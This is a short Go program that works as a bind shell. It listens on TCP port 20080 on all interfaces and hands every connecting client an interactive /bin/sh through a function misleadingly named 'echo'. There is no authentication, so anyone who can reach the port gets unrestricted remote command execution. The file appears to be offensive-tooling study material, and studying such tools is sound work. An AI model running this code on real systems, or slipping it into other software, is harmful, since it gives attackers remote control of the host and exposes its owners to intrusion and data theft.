package main

import (
	"io"
	"net"
	"os/exec"

	"log"
)

func echo(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")

	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	port := ":20080"
	listener, err := net.Listen("tcp", port)

	if err != nil {
		log.Fatalf("Unable to bind to port %s\n", port)
	}
	log.Println("Listening on 0.0.0.0" + port)

	for {
		conn, err := listener.Accept()
		log.Println("Received connection")

		if err != nil {
			log.Fatalf("Unable to accept connection: %s\n", err.Error())
		}
		go echo(conn)
	}
}
